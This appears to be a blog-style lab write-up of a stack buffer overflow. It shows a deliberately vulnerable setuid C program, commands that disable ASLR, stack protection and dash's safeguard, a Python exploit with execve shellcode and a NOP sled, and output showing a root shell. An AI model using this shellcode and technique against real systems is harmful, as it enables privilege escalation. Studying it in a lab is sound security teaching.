---
title: "Stack Buffer Overflow"
date: 2021-01-31T14:47:41+08:00
draft: false
---

The goal of the following experiments is to exploit buffer overflow attack and get the root privilege of the shell. 



## Setup

Environment:

1. Google cloud virtual machine: Ubuntu 20.04
2. Linux kernel version: 5.4.0 

Countermeasures:

1. ASLR (address space layout randomization) provided by the operating system
2. NX/DEP bit provided by the hardware architecture
3. StackGuard or canary mechanism provided by the compiler 

Check if ASLR is activated or not (default is 2):

```
$ cat /proc/sys/kernel/randomize_va_space 
2
```

Disable ASLR:

```
$ sudo sysctl -w kernel.randomize_va_space=0
kernel.randomize_va_space = 0
```

In the most recent Ubuntu operating systems, the /bin/sh points to the /bin/dash. Dash can prevent itself from being executed in a Set-UID process since it detects if the effective UID equals to real UID or not. More details about dash history can be found [here](https://bugs.launchpad.net/ubuntu/+source/dash/+bug/1215660). 

```
$ cd /bin && ls -l | grep "sh"
lrwxrwxrwx 1 root   root            4 Jan 29 23:22 sh -> dash
```

So we use another shell called zsh that does not have such a security countermeasure. 

```
$ sudo ln -sf /bin/zsh /bin/sh
```



## Vulnerable program

Here is a vulnerable program. It reads something from a file called badfile, then copy the content into the buffer. The program (the function strcpy()) does not limit the input from the user, so we can exploit this vulnerability. That is, we can make the program crash or execute some malicious code with buffer overflow attack. 

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#ifndef BUF_SZ 
#define BUF_SZ 100
#endif 

int bof(char *str)
{
    char buffer[BUF_SZ]; 
    strcpy(buffer, str);        // buffer overflow attack 
    return 1; 
}

int main(int argc, char** argv)
{
    char str[517]; 
    FILE* badfile; 

    badfile = fopen("badfile", "r"); 
    fread(str, sizeof(char), 517, badfile);     // read contents from badfile
    bof(str);                                   // copy to the buffer
    printf("Return properly\n"); 

    return 1; 
}
```

Compile the vulnerable program as follows, the flag "-z execstack" means to make the stack executable (since stacks are non-executable by default) and "-fno-stack-protector" means to disable the StackGuard protection. 

```
$ gcc -DBUF_SZ=100 -m32 -g -o stack-dbg -z execstack -fno-stack-protector stack.c
$ sudo chown root stack
$ sudo chmod 4755 stack 
```

```
$ ls -l | grep "stack"
-rwsr-xr-x 1 root ychin_chuang 15708 Jan 31 08:10 stack
```

Use gdb debugger to figure out the distance between the buffer and return address. As you can see, the distance is 0xffffd2a8 - 0xffffd23c  + 4 (the size of ebp) = 112. 

![](https://github.com/chuang76/image/blob/master/ch2-1.PNG?raw=true)



## Exploit

The shellcode in the following exploit program aims to execute "/bin/sh". We can use NOP-sled as a strategy to hit the start of our shellcode. NOP (0x90) means do nothing in the CPU instruction, so we can just slide in the buffer until reach the shellcode. Note that `ret` is 0xffffd2a8 plus some number. That is because the gdb pushes some environment data into the stack before running the program. Since the stack grows downwards in x86 processors, the actual frame pointer without debugging mode will be larger than 0xffffd2a8. 

```
#!/usr/bin/python3

import sys 
shellcode = (
        "\x31\xc0"
        "\x50"
        "\x68""//sh"
        "\x68""/bin"
        "\x89\xe3"
        "\x50"
        "\x53"
        "\x89\xe1"
        "\x99"
        "\xb0\x0b"
        "\xcd\x80"
    ).encode('latin-1')

# fill with NOPs 
content = bytearray(0x90 for i in range(517))

start = 517 - len(shellcode)
content[start:] = shellcode
ret = 0xffffd2a8 + 120     
offset = 112 
L = 4                       # 32-bit 

# modify the return address
content[offset:offset+L] = (ret).to_bytes(L, byteorder='little')

with open('badfile', 'wb') as f:
    f.write(content)
```

So we can launch an attack. 

```
$ rm badfile
$ python3 exploit.py 
$ ./stack 
# whoami 
root 
```

![](https://github.com/chuang76/image/blob/master/ch2-2.png?raw=true)

